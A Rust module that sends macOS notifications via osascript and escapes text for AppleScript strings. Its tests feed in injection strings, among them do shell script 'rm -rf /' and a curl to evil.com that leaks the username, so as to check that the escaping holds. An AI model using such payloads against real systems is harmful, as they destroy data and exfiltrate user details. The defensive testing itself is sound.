//! OS native notification support for macOS.
//!
//! Uses tokio::process::Command for async compatibility.

use crate::ports::NotificationSender;
use crate::Result;

/// macOS implementation — delegates to the `osascript` helpers below.
pub struct OsNotificationSender;

#[async_trait::async_trait]
impl NotificationSender for OsNotificationSender {
    async fn send(&self, title: &str, body: &str) -> Result<()> {
        send_os_notification(title, body).await
    }

    async fn send_critical(&self, title: &str, body: &str) -> Result<()> {
        send_os_notification_critical(title, body).await
    }
}

/// Sanitize text for embedding in an AppleScript double-quoted string.
fn sanitize_for_applescript(text: &str) -> String {
    let mut out = String::with_capacity(text.len() + 16);
    for ch in text.chars() {
        match ch {
            '\\' => out.push_str("\\\\"),
            '"' => out.push_str("\\\""),
            c if c.is_control() => {}
            c => out.push(c),
        }
    }
    out
}

/// Send a native OS notification via AppleScript.
pub async fn send_os_notification(title: &str, body: &str) -> Result<()> {
    use tokio::process::Command;

    let safe_title = sanitize_for_applescript(title);
    let safe_body = sanitize_for_applescript(body);

    let script = format!(
        "display notification \"{}\" with title \"{}\"",
        safe_body, safe_title
    );

    Command::new("osascript")
        .args(["-e", &script])
        .output()
        .await?;

    Ok(())
}

/// Build the AppleScript string for a critical notification (pure, testable).
pub fn build_critical_script(title: &str, body: &str) -> String {
    let safe_title = sanitize_for_applescript(title);
    let safe_body = sanitize_for_applescript(body);
    format!(
        "display notification \"{}\" with title \"URGENT · {}\" sound name \"Ping\"",
        safe_body, safe_title
    )
}

/// Send a native OS notification with elevated urgency.
pub async fn send_os_notification_critical(title: &str, body: &str) -> Result<()> {
    use tokio::process::Command;
    let script = build_critical_script(title, body);
    Command::new("osascript")
        .args(["-e", &script])
        .output()
        .await?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn plain_text_unchanged() {
        assert_eq!(sanitize_for_applescript("hello world"), "hello world");
    }

    #[test]
    fn escapes_backslash() {
        assert_eq!(
            sanitize_for_applescript("path\\to\\file"),
            "path\\\\to\\\\file"
        );
    }

    #[test]
    fn escapes_double_quote() {
        assert_eq!(sanitize_for_applescript(r#"say "hi""#), "say \\\"hi\\\"");
    }

    #[test]
    fn strips_newlines_and_carriage_returns() {
        assert_eq!(
            sanitize_for_applescript("line1\nline2\rline3"),
            "line1line2line3"
        );
    }

    #[test]
    fn strips_null_bytes() {
        assert_eq!(sanitize_for_applescript("before\0after"), "beforeafter");
    }

    #[test]
    fn strips_tabs() {
        assert_eq!(sanitize_for_applescript("col1\tcol2"), "col1col2");
    }

    #[test]
    fn injection_do_shell_script() {
        let input = r#"" & do shell script "whoami" & ""#;
        let sanitized = sanitize_for_applescript(input);
        assert!(
            !sanitized.contains('\n') || sanitized.replace("\\\"", "").find('"').is_none()
        );
        assert!(sanitized.contains("\\\""));
    }

    #[test]
    fn injection_newline_breakout() {
        let input = "\"\ndo shell script \"rm -rf /\"\n\"";
        let sanitized = sanitize_for_applescript(input);
        assert!(!sanitized.contains('\n'));
        assert!(!sanitized.contains('\r'));
    }

    #[test]
    fn unicode_preserved() {
        let input = "Hello 🌍 café résumé";
        assert_eq!(sanitize_for_applescript(input), input);
    }

    #[test]
    fn critical_applescript_includes_sound_and_urgent_prefix() {
        let script = build_critical_script("My Title", "My Body");
        assert!(script.contains("sound name"), "script must contain sound name clause: {script}");
        assert!(
            script.contains("URGENT · "),
            "script must contain URGENT · prefix: {script}"
        );
    }

    #[test]
    fn critical_applescript_sanitizes_input() {
        let script = build_critical_script("title\"injection", "body\nnewline");
        assert!(
            script.contains("title\\\"injection"),
            "double-quote in title must be escaped: {script}"
        );
        assert!(!script.contains('\n'), "raw newline must be stripped: {script}");
    }

    #[test]
    fn combined_attack_vector() {
        let input = "test\"; do shell script \"curl http://evil.com/$(whoami)\"\n--";
        let sanitized = sanitize_for_applescript(input);
        assert!(!sanitized.contains('\n'));
        let clean = sanitized.replace("\\\"", "");
        assert!(!clean.contains('"'), "unescaped double-quote found: {sanitized}");
    }
}
